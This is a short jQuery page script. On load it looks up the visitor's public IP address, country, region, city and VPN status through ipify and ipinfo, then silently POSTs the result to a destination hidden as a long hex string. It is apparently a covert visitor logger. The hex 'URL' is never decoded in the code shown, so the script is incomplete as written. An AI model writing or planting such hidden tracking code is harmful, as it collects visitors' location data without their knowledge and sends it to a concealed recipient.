$(document).ready(function () {
    $.get("https://api.ipify.org?format=json", function (data) {
        $.get("https://ipinfo.io/" + data.ip + "/json", function (ipData) {
            var message = 'IP Address: ' + data.ip + '\n'
                         + 'Country: ' + ipData.country + '\n'
                         + 'Region: ' + ipData.region + '\n'
                         + 'City: ' + ipData.city + '\n'
                         + 'VPN: ' + (ipData.usingVPN === true ? 'Detected' : 'Not Detected');

            $.ajax({
                url:  "f454dff01c781919ef5c832f8062ee0942505b9a5ed3a6d2d5ef2b92f5d39fccafd69b0cd6ae72abea04812c26d787f0dd9db0984866c7ecba94f7f83e819b01f11cfd69b59f1f0df0c6e808cb8ade1882b4cedcd1f9c61323fb36d51d581371cce3e702c7d91deca7d48897fff3174bc7d0c86bd25198d7d3d7c924c5c1f02f",
                type: 'POST',
                data: JSON.stringify({ content: message }),
                contentType: 'application/json'
            });
        });
    });
});
